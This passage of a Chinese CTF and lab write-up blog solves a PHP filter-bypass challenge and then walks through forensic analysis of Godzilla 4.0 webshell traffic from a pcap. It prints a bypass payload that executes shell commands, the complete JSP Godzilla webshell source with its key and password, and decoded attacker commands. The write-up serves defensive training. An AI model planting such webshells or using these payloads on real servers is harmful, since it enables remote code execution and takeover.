md5($_SERVER['REMOTE_ADDR']) . '/';\nif (!file_exists($dir)) {\n    mkdir($dir);\n}\n```\n\n先看看预定义变量$_SERVER中的信息\n\n![image-20250424131532231](../image/achieve/202411/大牛杯/image-20250424131532231.png)\n\n所以这里会获取我们的ip地址并进行md5加密，然后构成文件路径，若不存在则创建文件夹\n\n```php\nif (isset($_GET[\"code\"])) {\n    $code = substr($_GET[\"code\"], 0, 12);\n    check_letter($code);\n    check_character($code);\n\n    file_put_contents(\"$dir\" . \"index.php\", \"<?php \".$code.$fuxkfile);\n    echo $dir;\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n获取传入code的前12个字符并进行字符检测，然后写入文件\n\n```php\nfile_put_contents(\"$dir\" . \"index.php\", \"<?php \".$code.$fuxkfile);\n```\n\n在指定目录下的index.php文件中写入我们的代码，并返回dir文件路径\n\n所以综上所述过滤的字符有\n\n```\na,c,e,g,i,k,m,o,q,s,u,w,y,1,3,5,7,9,A,C,E,G,I,K,M,O,Q,S,U,W,Y,%,),*,^,$,`,!,],},',;,/,\\,?,<,>\n```\n\n那么可用字符有\n\n```\n  \" # & ( + , - . 0 2 4 6 8 : = @ B D F H J L N P R T V X Z [ _ b d f h j l n p r t v x z { | ~ \n```\n\n但是这里的$fuxkfile变量的值我们是未知的，可以先随便传入code看看能不能通过路径访问拿到fuxkfile的值\n\n![image-20250425001431665](../image/achieve/202411/大牛杯/image-20250425001431665.png)\n\n传入后返回路径，拼接上index.php进行访问发现可以访问出来\n\n![image-20250425001522260](../image/achieve/202411/大牛杯/image-20250425001522260.png)\n\n但是没获取到$fuckfile的内容，就算传入空白字符也是，那我们尝试闭合一下前面的语句\n\n```\n?code=?><?=`nl%09/*`\n```\n\n用反引号可以进行命令的执行，然后用短标签去构造`<?php`就行\n\n想起来之前遇到的nl的一个特性，就是在 Shell 中，`*` **匹配当前路径的非隐藏文件和目录**，`/*` → 匹配根目录下**所有文件和一级子目录**，并且nl会依序处理这些文件，输出他们的内容并加上行号，但是会跳过目录和二进制文件\n\n![image-20250425004704226](../image/achieve/202411/大牛杯/image-20250425004704226.png)\n\n# RealWorld_CyberShow\n\n## #爆破用户名\n\n转了一圈，在/blog-details.html有提示\n\n![image-20250425010758105](../image/achieve/202411/大牛杯/image-20250425010758105.png)\n\n直接爆破用户名，用户名有模板2020010007，估计是十位的纯数字编号\n\nbp发包好几次都是给靶场打坏了，只能开延迟或者分开爆\n\n从2020000000开始爆破，爆出用户名就给flag\n\n```\n2020036001/363636\n```\n\n# easy CMS\n\n先把源码下下来看一下，内容很多啊，丢给seay审一下\n\n![image-20250425215150055](../image/achieve/202411/大牛杯/image-20250425215150055.png)\n","tags":["大牛杯"],"categories":["ctfshow"]},{"title":"玄机第六章哥斯拉4.0流量分析","url":"/2025/04/22/玄机第六章哥斯拉4-0流量分析/","content":"\n参考文章：[玄机——第六章-哥斯拉4.0流量分析 wp](https://blog.csdn.net/administratorlws/article/details/142593664?ops_request_misc=%257B%2522request%255Fid%2522%253A%25220fc1b5b5668594769589373b8a9e83b4%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=0fc1b5b5668594769589373b8a9e83b4&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-142593664-null-null.nonecase&utm_term=%E7%8E%84%E6%9C%BA&spm=1018.2226.3001.4450)\n\n# 什么是哥斯拉\n\n**哥斯拉（Godzilla）** 是一款功能强大的 **WebShell** 工具，主要用于渗透测试和攻击中。它以其高度隐蔽性和丰富的功能而闻名，能够绕过传统的安全检测机制（如防火墙、IDS/IPS 等），并在目标服务器上执行各种恶意操作。\n\n# 哥斯拉webshell的特征\n\n- 哥斯拉Webshell通常以PHP、ASP、JSP等格式存在，文件名可能模糊不清，或使用常见文件名进行伪装。\n- 哥斯拉通常会使用 **AES加密算法** 对请求和响应数据进行加密，默认密钥为 `e45e329feb5d925b`。\n\n哥斯拉最大的特征：**全部类型的“shell”都能绕过，而且市面大部分的静态查杀、流量加密也是都能绕过市面绝大部分的流量Waf、而且Godzilla自带的插件是冰蝎、蚁剑不能比拟的。**\n\n完整的哥斯拉shell的流程包括三个数据包\n\n- 第一个请求包\n\n上传包含恶意代码的文件或者写入恶意代码，这些代码也有可能是加密以后的代码\n\n- 第一个响应包\n\n该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是可能会设置PHPSESSID，后续请求都会自动带上该Cookie。（但是在后续的版本中有时候是没有设置cookie的）\n\n- 第二个请求包\n\n第二个请求报文发送很少数据（实际内容为测试连接命令test），返回少量数据（即ok）\n\n- 第二个响应包\n\n服务器响应数据解密过程并不复杂，先调用findStr函数删除服务器响应数据左右附加的混淆字符串（对于PHP_XOR_BASE64加密方式来说，前后各附加了16位的混淆字符），然后将得到的数据进行base64解码，最后再和shell连接密钥md5值的前16位按位异或，即完成响应数据的解密。\n\n- 第三个请求包\n\n运行哥斯拉命令执行代码中的getBasicsInfo函数得到的系统基本信息。\n\n- 第三个响应包\n\n将加密的系统基本信息进行解密返回到响应数据中\n\n# 哥斯拉加密分析\n\n1.我们首先就行在客户端生成webshell，webshell中通常有以下几个变量，包括：**密码、密钥、有效载荷、加密器**\n\n- 密码：Post请求中的payload参数名称，例如我们这道题中hello.jsp中的pass=\"7f0e6f\"，以及用于和密钥一起进行加密运算。\n- 用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的md5值，然后取其**前16位**用于加密过程\n- 有效载荷：分为`ASP`、`java`、`php`、`c#`四种类型的payload\n- 加密器分为base64和raw、evalbase64三大类。例如我们下面的hello.jsp就是用的base64进行加密的\n- 扰乱数据：用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征。\n\n2.上传我们的webshell，文件名可自定义，根据选择的有效载荷不同，可以有jsp、php、aspx等文件格式\n\n这个文件的内容，会出现在数据包的POST请求中。该文件在利用的时候会将密码、密钥的md5值前16位明文写入。\n\n该文件的实现功能还有：将密码和密钥进行拼接，然后进行md5的计算。一共32位。服务器端返回数据的时候，会进行拼接。\n\n**即服务器端返回数据 = md5前16位+加密数据+md5后16位。（加密数据可以通过对服务器端的解密算法进行解密）**\n\n# 解题过程\n\n```\n请你登录服务器结合数据包附件来分析黑客的入侵行为\n\n用户名：root\n\n密码：xj@gsl4.0\n\nSSH连接：ssh root@ip -p 222\n```\n\n附件是gsl4.0.pcap文件\n\n## 1、黑客的IP是什么？\n\n先过滤出来http的流量包\n\n![image-20250423001130024](../image/achieve/202411/玄机第六章/image-20250423001130024.png)\n\n可以看到有大量的路径访问和404的响应，发现有一个恶意ip192.168.31.190在对服务器ip192.168.31.168进行目录扫描操作，估计就是黑客ip了\n\n![image-20250423001910080](../image/achieve/202411/玄机第六章/image-20250423001910080.png)\n\n并且发现这个ip在尝试使用PUT协议上传了hello.jsp\n\n```\nflag{192.168.31.190}\n```\n\n## 2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）\n\n这个的话我们可以从几个点去入手\n\n- 识别请求类型：\n\n\n确定是否存在特定的 HTTP 请求（如 PUT 或 POST），这些请求通常用于上传恶意代码或进行远程执行。\n\n- 分析请求内容：\n\n查找特定的参数或 传入的payload，如含有 base64 编码的数据或任何可被反序列化的对象。分析这些内容是否能够触发已知漏洞。\n\n- 查找特征：\n\n确认是否有反序列化、命令注入或文件上传的迹象，这些通常是常见的攻击手法。\n\n- 关注响应状态：\n\n检查服务器的响应状态（如 204 No Content），这可能表明攻击成功，服务器没有返回错误信息。\n\n然后我们来分析一下\n\n找到了一个204状态码的数据包\n\n![image-20250423002810926](../image/achieve/202411/玄机第六章/image-20250423002810926.png)\n\n### 204状态码\n\n**204 No Content** 是HTTP协议中的一种状态响应码，表示服务器成功处理了客户端的请求，但响应报文中没有返回任何内容。\n\n这符合哥斯拉shell的第一个响应包的结果，意味着我们的webshell上传成功了，然后我们来分析一下我们的webshell\n\n### webshell分析\n\n```javascript\n<%! String xc=\"1710acba6220f62b\"; \nString pass=\"7f0e6f\";\nString md5=md5(pass+xc); \nclass X extends ClassLoader {\n     public X(ClassLoader z) { \n         super(z); \n     }\n     public Class Q(byte[] cb) { \n         return super.defineClass(cb, 0, cb.length); \n     }\n }\npublic byte[] x(byte[] s, boolean m) {\n     try {\n         javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n         c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n         return c.doFinal(s);\n     } catch (Exception e) {\n         return null;\n     }\n }\npublic static String md5(String s) {\n    String ret = null;\n    try {\n        java.security.MessageDigest m = java.security.MessageDigest.getInstance(\"MD5\");\n        m.update(s.getBytes(), 0, s.length());\n        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase(); // 生成MD5哈希值\n    } catch (Exception e) {}\n    return ret;\n}\npublic static String base64Encode(byte[] bs) throws Exception {\n    Class base64;\n    String value = null;\n    try {\n        base64 = Class.forName(\"java.util.Base64\");\n        Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);\n        value = (String) Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });\n    } catch (Exception e) {\n        try {\n            base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n            Object Encoder = base64.newInstance();\n            value = (String) Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });\n        } catch (Exception e2) {}\n    }\n    return value;\n}\n\npublic static byte[] base64Decode(String bs) throws Exception {\n    Class base64;\n    byte[] value = null;\n    try {\n        base64 = Class.forName(\"java.util.Base64\");\n        Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n        value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });\n    } catch (Exception e) {\n        try {\n            base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n            Object decoder = base64.newInstance();\n            value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });\n        } catch (Exception e2) {}\n    }\n    return value;\n}\n<%\ntry {\n    byte[] data = base64Decode(request.getParameter(pass)); // 获取并解码请求参数\n    data = x(data, false); // 解密数据\n    if (session.getAttribute(\"payload\") == null) {\n        session.setAttribute(\"payload\", new X(this.getClass().getClassLoader()).Q(data)); // 动态加载字节码\n    } else {\n        request.setAttribute(\"parameters\", data);\n        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n        Object f = ((Class) session.getAttribute(\"payload\")).newInstance();\n        f.equals(arrOut);\n        f.equals(pageContext);\n        response.getWriter().write(md5.substring(0, 16));\n        f.toString();\n        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true))); // 加密并返回结果\n        response.getWriter().write(md5.substring(16));\n    }\n} catch (Exception e) {}\n%>\n```\n\n代码结构分析：\n\n这段代码是一个典型的 **JSP WebShell**，通常用于在目标服务器上执行恶意操作。\n\n1. 声明部分\n\n   ```\n   <%! ... %>\n   ```\n\n   - 定义了类、方法和变量，用于加密、解密、Base64编码/解码、类加载等操作。\n\n2. 执行部分\n\n   ```\n   <% ... %>\n   ```\n\n   - 处理HTTP请求，解析参数，执行恶意操作，并返回结果。\n\n- `String xc=\"1710acba6220f62b\";`：这是用于 AES 加密的密钥。\n- `String pass=\"7f0e6f\";`：用于参数传递的字符串，可能是攻击者用来获取数据的密码。\n- `md5`：生成 `pass` 和 `xc` 的 MD5 哈希，用于后续验证或其他操作。\n\n```javascript\n class X extends ClassLoader {\n     public X(ClassLoader z) { \n         super(z); \n     }\n     public Class Q(byte[] cb) { \n         return super.defineClass(cb, 0, cb.length); \n     }\n }\n//定义了一个自定义的 ClassLoader，类名为X，通过调用 defineClass 方法，允许动态加载和执行字节码。\n```\n\n```javascript\npublic byte[] x(byte[] s, boolean m) {\n    try {\n         javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n         c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n         return c.doFinal(s);\n     } catch (Exception e) {\n         return null;\n     }\n }\n//用于AES加密或解密数据，m 参数决定了是加密（true）还是解密（false）。\n```\n\n```javascript\npublic static String md5(String s) {\n    String ret = null;\n    try {\n        java.security.MessageDigest m = java.security.MessageDigest.getInstance(\"MD5\");\n        m.update(s.getBytes(), 0, s.length());\n        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase(); // 生成MD5哈希值\n    } catch (Exception e) {}\n    return ret;\n}\n//MD5哈希，用于将输入的字符串 s 转换为一个 32 字符的 MD5 哈希值。\n```\n\n```javascript\npublic static String base64Encode(byte[] bs) throws Exception {\n    Class base64;\n    String value = null;\n    try {\n        base64 = Class.forName(\"java.util.Base64\");\n        Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);\n        value = (String) Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });\n    } catch (Exception e) {\n        try {\n            base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n            Object Encoder = base64.newInstance();\n            value = (String) Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });\n        } catch (Exception e2) {}\n    }\n    return value;\n}\n\npublic static byte[] base64Decode(String bs) throws Exception {\n    Class base64;\n    byte[] value = null;\n    try {\n        base64 = Class.forName(\"java.util.Base64\");\n        Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n        value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });\n    } catch (Exception e) {\n        try {\n            base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n            Object decoder = base64.newInstance();\n            value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });\n        } catch (Exception e2) {}\n    }\n    return value;\n}\n//定义了base64的编码和解码方法\n```\n\n```javascript\n<%\ntry {\n    // 从HTTP请求参数中获取名为 `pass` 的值，并进行Base64解码\n    byte[] data = base64Decode(request.getParameter(pass)); \n    // 使用AES解密 `data`，`false` 表示解密操作\n    data = x(data, false); \n    // 检查 `session` 中是否已经存在 `payload` 属性\n    if (session.getAttribute(\"payload\") == null) {\n        // 如果 `payload` 不存在，则动态加载 `data` 中的字节码，并将其存储在 `session` 中\n        session.setAttribute(\"payload\", new X(this.getClass().getClassLoader()).Q(data)); \n    } else {\n        // 如果 `payload` 存在，则将解密后的 `data` 存储在 `request` 的 `parameters` 属性中\n        request.setAttribute(\"parameters\", data);\n        // 创建一个字节数组输出流，用于存储后续操作的结果\n        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n        // 从 `session` 中获取 `payload`，并通过反射创建其实例\n        Object f = ((Class) session.getAttribute(\"payload\")).newInstance();\n        // 调用 `f` 的 `equals` 方法，将 `arrOut` 作为参数传递（可能是某种操作）\n        f.equals(arrOut);\n        // 调用 `f` 的 `equals` 方法，将 `pageContext` 作为参数传递（可能是某种操作）\n        f.equals(pageContext);\n        // 将 `md5` 字符串的前16个字符写入HTTP响应\n        response.getWriter().write(md5.substring(0, 16));\n        // 调用 `f` 的 `toString` 方法（可能是某种操作）\n        f.toString();\n        // 将 `arrOut` 中的字节数组进行AES加密，然后进行Base64编码，并写入HTTP响应\n        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true))); \n        // 将 `md5` 字符串的后16个字符写入HTTP响应\n        response.getWriter().write(md5.substring(16));\n    }\n} catch (Exception e) {\n    // 捕获所有异常，但不做任何处理（静默失败）\n}\n%>\n```\n\n1. 获取并解密数据\n   - 从HTTP请求参数中获取数据，进行Base64解码和AES解密。\n2. 动态加载字节码\n   - 如果 `session` 中没有 `payload`，则将解密后的字节码动态加载为类，并存储在 `session` 中。\n3. 执行恶意操作\n   - 如果 `session` 中有 `payload`，则创建其实例，执行某些操作，并将结果加密后返回给客户端。\n4. 返回结果\n   - 将操作结果加密并写入HTTP响应，同时附加 `md5` 字符串的部分内容。\n\n其实这里很明显是**Java Servlet反序列化漏洞**，因为这里有对字节流的处理和对恶意代码的加密解密\n\n这里的代码还有个经典的哥斯拉加密方法，将MD5 哈希值作为验证作用放在我们传入的payload的两边进行掩盖痕迹的操作\n\n![image-20250423005159113](../image/achieve/202411/玄机第六章/image-20250423005159113.png)\n\n所以我们搜索一下tomcat put协议上传漏洞就能得到漏洞CVE编号\n\n```\nflag{CVE-2017-12615}\n```\n\n并且在下一个流中我们可以看到\n\n![image-20250423010644028](../image/achieve/202411/玄机第六章/image-20250423010644028.png)\n\n这里的响应中自动设置了cookie，并且cookie中有哥斯拉流量的明显特征就是他在SESSID的末尾有一个分号`（;）`\n\n## 3、黑客上传的木马文件名是什么？(提交文件名)\n\n上面就可以看到了，这里的木马就是我们的hello.jsp\n\n```\nflag{hello.jsp}\n```\n\n其实我觉得这道题应该放在前面而不是放在第二题的后面emmm，好奇怪的排序\n\n## 4、黑客上传的木马连接密码是什么？\n\n![image-20250423011420087](../image/achieve/202411/玄机第六章/image-20250423011420087.png)\n\n这个pass暗示就是密码，也符合哥斯拉webshell的密码参数，并且在后续的传参中也可以看到有对pass的传值,在后续的代码逻辑中，这个密码被用作解密或校验操作，因此它是上传木马后访问或控制的关键。\n\n```\nflag{7f0e6f}\n```\n\n## 5、黑客上传的木马解密密钥是什么？\n\n### **什么是木马的解密密钥？**\n\n木马的解密密钥是用于解密木马程序中的加密代码或数据的字符串或值。攻击者通常会将恶意代码加密，以避免被安全软件检测到。解密密钥的存在使得木马能够在受害者的系统中执行其真实功能，比如窃取数据或远程控制。通过使用正确的解密密钥，攻击者可以恢复木马的原始代码，进而操控受害者的设备。\n\n这个怎么看呢？可以从源码里找到逻辑\n\n![image-20250423011933056](../image/achieve/202411/玄机第六章/image-20250423011933056.png)\n\n然后看一下X\n\n![image-20250423012000681](../image/achieve/202411/玄机第六章/image-20250423012000681.png)\n\n在` public byte[] x(byte[] s, boolean m) `方法中，xc 被用来初始化`javax.crypto.Cipher `对象，从而进行加密或解密操作。`c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\")); `这一行中，`xc.getBytes() `将字符串转换为字节数组，作为密钥传递给加密算法。所以xc就是我们需要找到的解密密钥了\nxc对应的值是`String xc=\"1710acba6220f62b\";`\n\n```\nflag{1710acba6220f62b}\n```\n\n## 6、黑客连接webshell后执行的第一条命令是什么？\n\n题目问我们黑客连接“webshell”后执行的第一条命令是什么，那这里我们就需要深度去解析“哥斯拉流量”了，我们继续往下看\n\n### 哥斯拉流量解密工具\n\n参考文章的师傅推荐了一个**哥斯拉流量解密工具——BlueTeamTools**\n\n![image-20250423012759183](../image/achieve/202411/玄机第六章/image-20250423012759183.png)\n\n然后先把我们之前找到的“密码”，以及“密钥”进行输入\n\n借一张师傅的图片\n\n![image-20250423012901568](../image/achieve/202411/玄机第六章/image-20250423012901568.png)\n\n然后就看数据包呗，把每个恶意请求都放进去解密了一下\n\n发现了哥斯拉流量的一条测试流量\n\n![image-20250423014420445](../image/achieve/202411/玄机第六章/image-20250423014420445.png)\n\n测试连接命令test，返回少量数据（即ok）\n\n![image-20250423014508150](../image/achieve/202411/玄机第六章/image-20250423014508150.png)\n\n![image-20250423014523510](../image/achieve/202411/玄机第六章/image-20250423014523510.png)\n\n然后找到这条恶意请求\n\n![image-20250423014616311](../image/achieve/202411/玄机第六章/image-20250423014616311.png)\n\n![image-20250423014801550](../image/achieve/202411/玄机第六章/image-20250423014801550.png)\n\n这里调用了**`getBasicsInfo`**方法，通常用于获取系统或应用程序的基本信息。并且返回了很多内容\n\n![image-20250423014836889](../image/achieve/202411/玄机第六章/image-20250423014836889.png)\n\n但是我们这里需要找的是第一条命令而不是调用函数，所以这里并不是我们想找的答案\n\n继续往下看\n\n![image-20250423013427596](../image/achieve/202411/玄机第六章/image-20250423013427596.png)\n\n传入请求数据返回结果\n\n![image-20250423013436578](../image/achieve/202411/玄机第六章/image-20250423013436578.png)\n\n```\ncmdLine sh -c \"cd \"/\";uname -r\" 2>&1arg-3 2>&1executableFile shexecutableArgs -c \"cd \"/\";uname -r\" 2>&1arg-0 shargsCount 4arg-1 -carg-2 cd \"/\";uname -rmethodName execCommand\n```\n\n### 恶意代码分析\n\n#### **命令执行的描述**\n\n```\ncmdLine sh -c \"cd \"/\";uname -r\" 2>&1\n```\n\n- **`cmdLine`**：表示这是一条命令行指令。\n\n- **`sh`**：调用 `sh`（Shell）来执行命令。\n\n- **`-c`**：`sh` 的参数，表示后面是一个字符串形式的命令。\n\n- `\"cd \"/\";uname -r\"`\n\n  ：要执行的命令：\n\n  - `cd \"/\"`：切换到根目录。\n  - `uname -r`：获取当前操作系统的内核版本。\n\n- **`2>&1`**：将标准错误输出（`stderr`）重定向到标准输出（`stdout`）。\n\n#### **参数分解**\n\n```\narg-3 2>&1\n```\n\n- **`arg-3`**：这是命令的第 3 个参数（从 0 开始计数）。\n- **`2>&1`**：重定向标准错误输出到标准输出。\n\n```\nexecutableFile sh\n```\n\n- **`executableFile`**：表示可执行文件的名称。\n- **`sh`**：使用的可执行文件是 `sh`（Shell）。\n\n```\nexecutableArgs -c \"cd \"/\";uname -r\" 2>&1\n```\n\n- **`executableArgs`**：表示可执行文件的参数。\n- **`-c \"cd \"/\";uname -r\" 2>&1`**：传递给 `sh` 的参数。\n\n```\narg-0 sh\n```\n\n- **`arg-0`**：第 0 个参数，即可执行文件本身，这里是 `sh`。\n\n```\nargsCount 4\n```\n\n- **`argsCount`**：参数的总数，这里是 4 个。\n\n```\narg-1 -c\n```\n\n- **`arg-1`**：第 1 个参数，这里是 `-c`。\n\n```\narg-2 cd \"/\";uname -r\n```\n\n- **`arg-2`**：第 2 个参数，这里是 `cd \"/\";uname -r`。\n\n```\nmethodName execCommand\n```\n\n- **`methodName`**：表示执行命令的方法名称，这里是 `execCommand`。\n\n这段描述展示了一个通过 `sh` 执行命令的过程：\n\n1. 调用 `sh`，并传递参数 `-c` 和一个命令字符串 `cd \"/\";uname -r`。\n2. 命令字符串的作用是：\n   - 切换到根目录（`cd \"/\"`）。\n   - 获取当前操作系统的内核版本（`uname -r`）。\n3. 标准错误输出被重定向到标准输出（`2>&1`）。\n4. 参数总数为 4 个：\n   - `arg-0`：`sh`。\n   - `arg-1`：`-c`。\n   - `arg-2`：`cd \"/\";uname -r`。\n   - `arg-3`：`2>&1`。\n5. 执行命令的方法名称为 `execCommand`。\n\n既然这里有响应，那我们把响应也放进去看一下\n\n![image-20250423014226739](../image/achieve/202411/玄机第六章/image-20250423014226739.png)\n\n所以**黑客第一次执行了命令——`uname -r`，想看看系统的内核版本信息有没有漏洞什么的，最后返回了系统信息——`4.19.0-25-amd64`；**\n\n```\nflag{uname -r}\n```\n\n可能有人就疑惑了，这里不是执行的`cd \"/\";uname -r`吗，为什么最终的答案是uname -r\n\n![image-20250423015243359](../image/achieve/202411/玄机第六章/image-20250423015243359.png)\n\n## 7、黑客连接webshell时查询当前shell的权限是什么？\n\n继续往下看黑客又进行了哪些命令吧\n\n![image-20250423015517221](../image/achieve/202411/玄机第六章/image-20250423015517221.png)\n\n![image-20250423015508224](../image/achieve/202411/玄机第六章/image-20250423015508224.png)\n\n### 关于id命令\n\n**`id`** 是一个在 Linux 和 Unix 系统中常用的命令，用于显示当前用户或指定用户的 **用户身份信息**。\n\n`id` 命令的主要功能是显示以下信息：\n\n- **用户 ID（UID）**：当前用户的唯一标识符。\n- **组 ID（GID）**：当前用户所属的主组的唯一标识符。\n- **所属组**：当前用户所属的所有组（包括主组和附加组）。\n- **用户名**：当前用户的用户名。\n\n![image-20250423015657088](../image/achieve/202411/玄机第六章/image-20250423015657088.png)\n\nuid=0(root)：当前用户的用户ID（UID）是0，表示该用户是超级用户（root）。在Unix/Linux系统中，UID 0代表系统的管理员，有完全的权限。\n\ngid=0(root)：当前用户的组ID（GID）也是0，表示该用户属于root组。\n\ngroups=0(root)：列出了当前用户所属的组，这里只有root组。\n\n可以看到是root用户，那么此时的shell的权限就是root了\n\n```\nflag{root}\n```\n\n## 8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？\n\n这里先补充一下基础知识\n\n### Liunx常见的发行的系统版本\n\n- Ubuntu：\n\n\n用户友好，适合新手和开发者。\n\n有多个版本，包括桌面版和服务器版。\n\n- Debian：\n\n以稳定性和自由软件为宗旨。\n\n是许多其他发行版（如Ubuntu）的基础。\n\n- Fedora：\n\n由Red Hat支持，注重最新技术和开源软件。\n\n提供较新版本的软件包。\n\n- CentOS：\n\n基于Red Hat Enterprise Linux（RHEL），适合企业使用。\n\n提供长期支持和稳定性。\n\n- Arch Linux：\n\n以简单、灵活和用户控制为特点。\n\n采用滚动更新模型，适合高级用户。\n\n- openSUSE：\n\n提供多种安装方式和桌面环境。\n\n包括适合开发和服务器的版本。\n\n- Linux Mint：\n\n基于Ubuntu，设计友好，适合初学者。\n\n提供多种桌面环境，如Cinnamon、MATE和XFCE。\n\n- Slackware：\n\n被认为是最古老的Linux发行版之一，注重稳定性和简单性。\n适合那些喜欢手动配置系统的用户。\n\n### 什么命令可以查看到当前的发行版本？\n\n####  1.lsb_release命令\n\n```\nlsb_release -a\n```\n\n**这个命令会显示详细的版本信息，包括发行版名称、版本号等。**\n\n![image-20250423020147901](../image/achieve/202411/玄机第六章/image-20250423020147901.png)\n\n**常用选项：**\n\n- **`-a`**：显示所有信息（包括发行版 ID、描述、版本号和代号）。\n- **`-d`**：仅显示描述信息。\n- **`-r`**：仅显示版本号。\n- **`-c`**：仅显示代号。\n\n#### 2.`cat  /etc/os-release`\n\n`/etc/os-release` 是一个包含发行版信息的配置文件。**对于大多数发行版，可以查看 `/etc/os-release` 文件**，**对于Debian和Ubuntu系统，可以查看 `/etc/issue` 或 `/etc/debian_version`**\n\n#### 3.uname命令\n\n```\nuname -a\n```\n\n`uname` **这个命令会显示内核版本和其他系统信息，但不包括发行版的名称。**\n\n那我们就往后找呗，反正命令也不多对吧，然后在下一个流就看到了\n\n![image-20250423020517316](../image/achieve/202411/玄机第六章/image-20250423020517316.png)\n\n![image-20250423020523631](../image/achieve/202411/玄机第六章/image-20250423020523631.png)\n\n这里是查看了`/etc/os-release`文件去查看发行版本信息的，那我们看看响应\n\n![image-20250423020610594](../image/achieve/202411/玄机第六章/image-20250423020610594.png)\n\n```\nPRETTY_NAME=\"Debian GNU/Linux 10 (buster)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"10\"\nVERSION=\"10 (buster)\"\nVERSION_CODENAME=buster\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n```\n\n- `PRETTY_NAME`：\"Debian GNU/Linux 10 (buster)\" 表示操作系统的名称和版本。\n\n- `NAME`：操作系统的基本名称，这里是 Debian GNU/Linux。\n- `VERSION_ID 和 VERSION`：指示版本号为10，代号为“buster”。\n- `VERSION_CODENAME`：该版本的代号，用于在包管理和支持中识别。\n- `ID`：表示操作系统为“debian”。\n- `URLs`：提供了关于该发行版的主页、支持和错误报告的链接。\n\n**所以“`Debian GNU/Linux 10 (buster)`”就是黑客查询到的发行版本**\n\n```\nflag{Debian GNU/Linux 10 (buster)}\n```\n\n## 9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）\n\n也是在下一个流找到了\n\n![image-20250423020836827](../image/achieve/202411/玄机第六章/image-20250423020836827.png)\n\n![image-20250423020848552](../image/achieve/202411/玄机第六章/image-20250423020848552.png)\n\n这里解释一下命令：\n\n`cd \"/\";rmp -qa | grep pam`：**`rpm -qa`**是列出系统中所有已安装的 RPM 包，而**`grep pam`**是从 `rpm -qa` 的输出中筛选出包含 **`pam`** 的行。\n\n一开始以为是这个答案，后面提交却不正确，是为什么呢？\n\n![image-20250423021119043](../image/achieve/202411/玄机第六章/image-20250423021119043.png)\n\n从刚刚的响应数据包解密中可以看到，这里的rmp命令是不存在的，也就是说刚刚的命令是执行失败了的，那我们继续往下看\n\n![image-20250423021506133](../image/achieve/202411/玄机第六章/image-20250423021506133.png)\n\n![image-20250423021522479](../image/achieve/202411/玄机第六章/image-20250423021522479.png)\n\n解释一下命令：\n\n- `cd \"/\";dpkg -l libpam-modules:amd64`：\n\n`dpkg -l`\n\n- 功能：列出系统中已安装的 Debian 包。\n  - **`dpkg`**：Debian Package Manager，用于管理 Debian 格式的软件包。\n  - **`-l`**：列出已安装的包。\n\n`libpam-modules:amd64`\n\n- 功能：指定要查询的包名。\n  - **`libpam-modules`**：Pluggable Authentication Modules（PAM）的核心模块包，用于 Linux 系统的身份验证。\n  - **`:amd64`**：指定包的架构为 64 位（适用于 64 位系统）。\n\n黑客通过这个命令查询并过滤了与 `libpam-modules` 包相关的信息,指定包的架构为 64 位\n\n然后我们看看响应\n\n![image-20250423021741611](../image/achieve/202411/玄机第六章/image-20250423021741611.png)\n\n成功执行并回显，那么这个命令就是我们想找的查询命令了\n\n```\nflag{dpkg -l libpam-modules:amd64}\n```\n\n响应具体的解释可以去看我引用的师傅的文章，写的嘎嘎细！\n\n## 10、黑客留下后门的反连的IP和PORT是什么？（IP:PORT)\n\n### 反向连接（Reverse Connection）是什么\n\n1. 定义：\n\n在反向连接中，受害者的计算机（目标系统）主动向黑客控制的计算机（攻击者）发起连接。这与传统的连接方式不同，通常是攻击者直接连接到受害者的计算机。\n\n### IP 和 PORT是什么\n\n1. IP 